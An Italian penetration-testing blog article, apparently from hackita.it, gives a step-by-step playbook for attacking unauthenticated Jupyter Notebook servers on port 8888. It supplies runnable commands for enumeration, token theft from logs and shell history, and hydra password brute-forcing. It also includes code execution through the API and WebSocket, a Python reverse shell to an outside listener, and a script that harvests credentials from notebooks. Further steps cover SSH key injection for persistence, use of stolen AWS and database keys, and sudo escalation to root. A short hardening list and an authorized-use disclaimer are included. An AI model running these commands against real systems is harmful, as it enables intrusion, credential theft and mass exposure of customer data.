---
title: 'Porta 8888 Jupyter Notebook: RCE Diretto e Credential Extraction'
slug: porta-8888-jupyter
description: 'Porta 8888 Jupyter Notebook senza autenticazione: code execution diretto, token leak, terminal integrato, credenziali hardcoded nei notebook e chain offensiva reale passo dopo passo.'
image: /porta-8888-jupyter.webp
draft: true
date: 2026-04-17T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - porta-8888
  - jupyter-notebook-pentest
  - jupyter-no-auth-rce
  - data-science-security
---

Jupyter Notebook è l'ambiente di sviluppo interattivo più usato al mondo per data science, machine learning e analisi dati. Ascolta sulla porta 8888 TCP e permette di scrivere ed eseguire codice Python (o R, Julia, Bash) direttamente dal browser. Nel penetration testing, trovare un Jupyter Notebook accessibile è come trovare una shell già pronta con un'interfaccia grafica: apri il browser, scrivi `import os; os.system("id")` in una cella e premi Shift+Enter. Sei dentro.

La ragione per cui Jupyter è un target così frequente è la sua natura: è progettato per **eseguire codice arbitrario** — non è un bug, è la funzionalità principale. Il problema nasce quando viene esposto sulla rete senza autenticazione, con un token debole, o su un server che contiene credenziali e dati sensibili. E succede più spesso di quanto immagini — data scientist che lanciano `jupyter notebook --ip=0.0.0.0 --no-browser` per accedere dal portatile e dimenticano che l'hanno fatto.

Un episodio classico: pentest interno per un'azienda di e-commerce, scansione Nmap, porta 8888 su un server del team analytics. Nessuna password, nessun token. Ho aperto il browser, trovato un notebook chiamato `customer_analysis.ipynb` con le credenziali del data warehouse [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql) hardcoded nelle prime celle, e un altro chiamato `ml_pipeline.ipynb` con le API key di AWS S3. Tutto in chiaro, tutto accessibile. Il data scientist non sapeva nemmeno che la porta era raggiungibile dalla rete aziendale.

## Cos'è Jupyter Notebook

Jupyter organizza il codice in **notebook** (file `.ipynb`): documenti interattivi con celle di codice, output e testo markdown. Ogni notebook è collegato a un **kernel** — un processo Python (o altro linguaggio) che esegue il codice. Il server Jupyter gestisce i kernel e serve l'interfaccia web.

```
Browser                      Jupyter Server (:8888)        Sistema Operativo
┌──────────────┐            ┌─────────────────────────┐   ┌──────────────┐
│ Notebook UI  │──HTTP/WS──►│ Tornado web server       │   │              │
│              │            │  ├── Notebook: analysis   │   │              │
│ Cella Python │            │  │   └── Kernel (Python) ─┼──►│ os.system()  │
│ os.system()  │            │  ├── Notebook: ml_pipe    │   │ file I/O     │
│              │            │  │   └── Kernel (Python) ─┼──►│ network      │
│ Terminal     │            │  └── Terminal ────────────┼──►│ bash shell   │
│ (bash)       │            │                           │   │              │
└──────────────┘            └─────────────────────────┘   └──────────────┘
```

| Porta     | Servizio          | Note                                            |
| --------- | ----------------- | ----------------------------------------------- |
| **8888**  | Jupyter Notebook  | Porta default                                   |
| 8889-8899 | Jupyter secondari | Se più istanze girano sullo stesso server       |
| 8888      | JupyterLab        | Stessa porta, interfaccia diversa (più moderna) |
| 8888      | JupyterHub        | Multi-user, spesso su porta 8000                |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 8888,8889,8890,8000 10.10.10.40
```

```
PORT     STATE SERVICE    VERSION
8888/tcp open  http       Tornado httpd 6.4 (Jupyter Notebook)
```

`Tornado httpd` + `Jupyter` nel banner → conferma.

### Test accesso

```bash
# Verifica se è accessibile senza token
curl -s http://10.10.10.40:8888/api/contents | head -50
```

Se risponde con JSON (lista file) → **accesso senza autenticazione**. Se risponde `403` o redirect a `/login` → richiede token o password.

### API endpoints

```bash
# Lista notebook e file
curl -s http://10.10.10.40:8888/api/contents

# Lista kernel in esecuzione
curl -s http://10.10.10.40:8888/api/kernels

# Lista sessioni attive
curl -s http://10.10.10.40:8888/api/sessions

# Info server
curl -s http://10.10.10.40:8888/api/status
```

## 2. Autenticazione e Token

### Senza autenticazione (il caso migliore per il pentester)

Se Jupyter è stato lanciato con `--NotebookApp.token=''` o `--NotebookApp.disable_check_xsrf=True` → accesso libero.

### Token nell'URL

Jupyter genera un token casuale all'avvio e lo mostra nel terminale:

```
http://localhost:8888/?token=abc123def456ghi789jkl012mno345pqr678stu901
```

Se trovi il token → accesso completo. Dove cercarlo:

* **Log del server** — `~/.jupyter/jupyter_notebook.log`, output di `docker logs`
* **Command line** — `ps aux | grep jupyter` mostra spesso il token come argomento
* **File di config** — `~/.jupyter/jupyter_notebook_config.py` può avere un token hardcoded
* **Shell history** — `~/.bash_history` contiene il comando di avvio con il token

```bash
# Se hai accesso al filesystem via altra vulnerabilità
cat /home/*/.jupyter/jupyter_notebook_config.py 2>/dev/null | grep -i token
cat /proc/*/cmdline 2>/dev/null | tr '\0' '\n' | grep -i token
grep -r "token=" /home/*/.bash_history 2>/dev/null
```

### Password

Se è configurata una password (hash SHA nel config):

```bash
# Brute force (il login è un semplice form POST)
hydra -l "" -P /usr/share/wordlists/rockyou.txt 10.10.10.40 http-post-form \
  "/login:password=^PASS^:Invalid credentials" -s 8888
```

### Token URL con query parameter

```bash
# Se hai il token
curl -s "http://10.10.10.40:8888/api/contents?token=abc123def456..."
```

## 3. Code Execution — L'Attacco Principale

Con accesso a Jupyter, hai code execution nativo. Non è un exploit — è la funzionalità.

### Via interfaccia web

Apri `http://10.10.10.40:8888` → New → Python 3 → scrivi nella cella:

```python
import os
os.system("id")
```

```
uid=1000(datascientist) gid=1000(datascientist) groups=1000(datascientist),27(sudo)
```

### Via API (senza browser)

```bash
# 1. Crea un nuovo kernel
KERNEL=$(curl -s -X POST http://10.10.10.40:8888/api/kernels -H "Content-Type: application/json" | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])")

# 2. Esegui codice via WebSocket
pip install websocket-client
python3 << 'EOF'
import websocket, json, uuid

ws = websocket.create_connection(f"ws://10.10.10.40:8888/api/kernels/{KERNEL_ID}/channels")

msg = {
    "header": {"msg_id": str(uuid.uuid4()), "msg_type": "execute_request"},
    "parent_header": {},
    "metadata": {},
    "content": {"code": "import os; print(os.popen('id').read())", "silent": False}
}
ws.send(json.dumps(msg))

while True:
    resp = json.loads(ws.recv())
    if resp.get("msg_type") == "stream":
        print(resp["content"]["text"])
        break
EOF
```

### Terminal integrato

Jupyter ha un **terminale bash** integrato:

```bash
# Verifica se i terminali sono abilitati
curl -s http://10.10.10.40:8888/api/terminals

# Crea un nuovo terminale
curl -s -X POST http://10.10.10.40:8888/api/terminals -H "Content-Type: application/json"
```

Apri `http://10.10.10.40:8888/terminals/1` → shell bash completa nel browser. Nessun bisogno di reverse shell.

### Reverse shell (per persistenza)

```python
# In una cella Jupyter
import socket,subprocess,os
s=socket.socket()
s.connect(("10.10.10.200",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

## 4. Estrazione Dati dai Notebook

I notebook `.ipynb` sono file JSON leggibili — contengono tutto il codice mai eseguito, incluse credenziali hardcoded:

```bash
# Lista tutti i notebook
curl -s http://10.10.10.40:8888/api/contents | python3 -c "
import sys,json
data = json.load(sys.stdin)
for item in data.get('content', []):
    if item['name'].endswith('.ipynb'):
        print(item['path'])
"

# Scarica un notebook
curl -s http://10.10.10.40:8888/api/contents/customer_analysis.ipynb | python3 -m json.tool

# Cerca credenziali in tutti i notebook
for nb in $(curl -s http://10.10.10.40:8888/api/contents | python3 -c "import sys,json;[print(i['path']) for i in json.load(sys.stdin).get('content',[]) if i['name'].endswith('.ipynb')]"); do
    echo "=== $nb ==="
    curl -s "http://10.10.10.40:8888/api/contents/$nb" | python3 -c "
import sys,json
nb = json.load(sys.stdin)
for cell in nb.get('content',{}).get('cells',[]):
    src = ''.join(cell.get('source',[]))
    if any(w in src.lower() for w in ['password','secret','key','token','credential','jdbc','conn']):
        print(src[:500])
        print('---')
"
done
```

Cosa trovo tipicamente nei notebook:

* **Connection string** a database ([PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql), [MySQL](https://hackita.it/articoli/porta-3306-mysql), [MongoDB](https://hackita.it/articoli/porta-27017-mongodb))
* **API key** per servizi cloud (AWS, GCP, Azure)
* **Token** per API interne
* **Credenziali SSH/SFTP** per spostare dati
* **Query SQL** con dati sensibili nell'output

## 5. Micro Playbook Reale

**Minuto 0-1 → Verifica accesso**

```bash
curl -s http://TARGET:8888/api/contents
# Se 200 + JSON → accesso libero
# Se 403/redirect → serve token/password
```

**Minuto 1-3 → Code execution test**

```bash
# Apri browser → http://TARGET:8888 → New → Python 3
import os; os.system("id; whoami; hostname; cat /etc/passwd | head -5")
```

**Minuto 3-10 → Estrazione credenziali dai notebook**

```bash
# Scarica tutti i .ipynb e cerca password
# Controlla anche .py, .env, .cfg nella file list
curl -s http://TARGET:8888/api/contents
```

**Minuto 10+ → Persistenza e pivoting**

```bash
# Reverse shell o SSH key injection
echo "SSH_PUB_KEY" >> ~/.ssh/authorized_keys
# Enumera la rete dal server Jupyter
ip a; netstat -tlnp; cat /etc/hosts
```

## 6. Caso Studio Concreto

**Settore:** E-commerce, 150 dipendenti, team data di 8 persone.

**Scope:** Pentest interno, credenziale standard sulla rete.

Scansione Nmap → porta 8888 su `10.10.10.80` (hostname `analytics-01`). Nessun token richiesto — il data scientist aveva lanciato Jupyter con `--NotebookApp.token=''` "per comodità".

Sul server: 23 notebook `.ipynb`. In `etl_pipeline.ipynb` c'erano le credenziali del data warehouse PostgreSQL (utente `etl_admin` con `SELECT` su tutto lo schema). In `recommendation_engine.ipynb` c'erano le API key di AWS S3 con permessi `s3:GetObject` su 4 bucket — uno dei quali conteneva i backup del database di produzione con dati di 500.000 clienti (nome, email, indirizzo, storico ordini). In `.env` (visibile nella file list di Jupyter): credenziali [Redis](https://hackita.it/articoli/porta-6379-redis) e chiave segreta JWT dell'applicazione.

Il server aveva anche `sudo` senza password per l'utente `datascientist` (nel sudoers per installare pacchetti Python) → `sudo su` → root.

**Tempo dall'accesso ai dati dei 500K clienti:** 15 minuti. **Root cause:** Jupyter senza token + credenziali hardcoded nei notebook + sudo NOPASSWD.

## 7. Errori Comuni Reali Trovati nei Pentest

**1. Token vuoto o disabilitato (frequentissimo)**
`--NotebookApp.token=''` per "comodità" durante lo sviluppo. Il "temporaneo" diventa permanente. Lo trovo nel 60% dei Jupyter esposti sulla rete.

**2. Bind su 0.0.0.0**
`jupyter notebook --ip=0.0.0.0` per accedere dal laptop. Raggiungibile da tutta la rete, a volte da Internet.

**3. Credenziali hardcoded nei notebook**
Connection string, API key, token — i data scientist scrivono le credenziali nelle prime celle e le lasciano lì. Il notebook è un file JSON salvato su disco — persiste indefinitamente.

**4. Esecuzione come root o con sudo NOPASSWD**
Per installare librerie Python senza problemi di permessi. Risultato: code execution come root.

**5. Notebook su server di produzione**
Jupyter installato sullo stesso server che ha accesso ai database di produzione, alle API e alla rete interna. Il code execution su Jupyter diventa accesso a tutto.

**6. Nessun monitoraggio**
Nessun log di chi accede, nessun alert su nuovi kernel, nessun controllo su comandi eseguiti. Un attaccante può lavorare indisturbato.

## 8. Mini Chain Offensiva Reale

```
Jupyter :8888 → Code Exec → Notebook Creds → PostgreSQL → AWS S3 API Key → Backup DB Produzione → 500K clienti
```

**Step 1 — Accesso Jupyter**

```bash
curl -s http://10.10.10.80:8888/api/contents
# → 200 OK, lista file
```

**Step 2 — Code execution**

```python
# Nel browser: New → Python 3
import os; print(os.popen("id; cat /etc/passwd").read())
# → uid=1000(datascientist) ... groups=27(sudo)
```

**Step 3 — Estrazione credenziali dai notebook**

```python
# Trovato in etl_pipeline.ipynb:
# conn = psycopg2.connect("host=db01 dbname=warehouse user=etl_admin password=Etl_Pr0d!")
# Trovato in .env:
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=wJalr...
```

**Step 4 — Accesso PostgreSQL**

```bash
psql -h db01 -U etl_admin -d warehouse -c "SELECT count(*) FROM customers;"
# → 500000
```

**Step 5 — Accesso AWS S3**

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=wJalr...
aws s3 ls s3://corp-backups/
# → 2026-02-01 db_prod_backup_20260201.sql.gz
```

**Step 6 — Privilege escalation locale**

```bash
sudo su -  # NOPASSWD nel sudoers
# → root@analytics-01
```

Jupyter senza token → credenziali in chiaro → database + cloud → mezzo milione di clienti.

## 9. Detection & Hardening

* **Token forte** o password — mai `--NotebookApp.token=''`
* **Bind su 127.0.0.1** — Jupyter solo via SSH tunnel o VPN
* **JupyterHub** per ambienti multi-utente — autenticazione centralizzata con LDAP/OAuth
* **Non eseguire come root** — utente dedicato senza sudo
* **Non hardcodare credenziali** — usare variabili d'ambiente o vault
* **Separare** il server Jupyter dai database di produzione
* **Monitorare** nuovi kernel e terminali
* **Audit notebook** periodicamente per credenziali esposte

## 10. Mini FAQ

**Jupyter senza token è davvero così comune?**
Sì — lo trovo nel 60% dei casi durante i pentest interni. I data scientist lo lanciano senza token per comodità, e il "temporaneo" diventa permanente. A volte lo trovo anche in container Docker senza token esposti su Internet.

**Posso usare Jupyter per fare pivoting?**
Assolutamente: hai Python con accesso alla rete. Puoi scansionare subnet, connetterti a database, fare richieste HTTP, installare tool con `pip`. Il terminale integrato ti dà una shell bash completa. È il punto di pivot più comodo che esista.

**Come trovo Jupyter se non è sulla porta 8888?**
`nmap -sV --allports target` — il banner Tornado è riconoscibile. Cerca anche le porte 8889-8899, 8000 (JupyterHub). Nei container Docker, la porta potrebbe essere mappata su qualsiasi porta host.

## 11. Cheat Sheet Finale

| Azione           | Comando                                                 |
| ---------------- | ------------------------------------------------------- |
| Nmap             | `nmap -sV -p 8888 target`                               |
| Test accesso     | `curl -s http://target:8888/api/contents`               |
| Lista file       | `curl -s http://target:8888/api/contents`               |
| Kernel attivi    | `curl -s http://target:8888/api/kernels`                |
| Sessioni         | `curl -s http://target:8888/api/sessions`               |
| Terminali        | `curl -s http://target:8888/api/terminals`              |
| Crea terminale   | `curl -s -X POST http://target:8888/api/terminals`      |
| Scarica notebook | `curl -s http://target:8888/api/contents/FILE.ipynb`    |
| Con token        | `curl -s "http://target:8888/api/contents?token=TOKEN"` |
| Code exec        | Browser → New → Python 3 → `import os; os.system("id")` |
| Cerca creds      | `grep -ri "password\|secret\|key" *.ipynb`              |

***

Riferimento: Jupyter Security docs, OWASP testing, HackTricks. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-8888-dev-http-development-hypertext-transfer-protocol](https://www.pentestpad.com/port-exploit/port-8888-dev-http-development-hypertext-transfer-protocol)

> Il tuo team data ha Jupyter esposto sulla rete senza token? Con le credenziali del data warehouse hardcoded nei notebook? [Assessment HackIta](https://hackita.it/servizi) per scoprirlo. Per imparare l'exploitation dei servizi data/ML: [formazione 1:1](https://hackita.it/formazione).
